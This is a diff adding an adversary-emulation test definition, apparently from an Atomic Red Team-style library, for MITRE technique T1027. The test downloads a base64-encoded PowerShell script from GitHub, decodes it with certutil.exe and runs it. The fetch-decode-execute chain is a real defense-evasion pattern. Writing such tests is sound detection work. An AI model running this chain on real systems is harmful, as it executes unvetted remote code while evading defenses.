@@ -1,0 +1,37 @@
+attack_technique: T1027
+display_name: Obfuscated Files or Information
+atomic_tests:
+- name: Decoding and Executing Base64 Encoded PowerShell Script via certutil.exe
+  auto_generated_guid: f4f831a6-8985-407a-8bdd-eb825d1682dd
+  description: |
+    Decodes a base64 encoded script using the LOLBAS executable certutil.exe with the -decode argument.
+
+    Upon successful execution you will find a txt file in the C:\Users\Public path that has a GUID as a file name. 
+    This file will contain the output of the encoded PS1 script.
+  supported_platforms:
+  - windows
+  input_arguments:
+    encoded_file:
+      description: Path of the base64 encoded PS1 file to decode and execute
+      type: path
+      default: PathToAtomicsFolder\certutil_decode\src\encoded_discovery_script.txt
+    decode_path:
+      description: Path to drop decoded output to
+      type: path
+      default: PathToAtomicsFolder\certutil_decode\src\decoded_discovery_script.ps1
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      File to decode must exist on disk at specified location (#{encoded_file})
+    prereq_command: |
+      if (Test-Path "#{encoded_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/Inovasys-CS/EDI/raw/main/emulation_and_detection/defense_evasion/certutil_decode/src/encoded_discovery_script.txt" -OutFile "#{encoded_file}"
+  executor:
+    command: |
+      certutil -decode #{encoded_file} #{decode_path}
+      #{decode_path}
+    cleanup_command: |
+      $file_to_delete = (ls 'C:\Users\Public' | % { $_.Name  }  | Select-String -Pattern '-')
+      Remove-Item -Force -Path "C:\Users\Public\$file_to_delete"
+    name: powershell
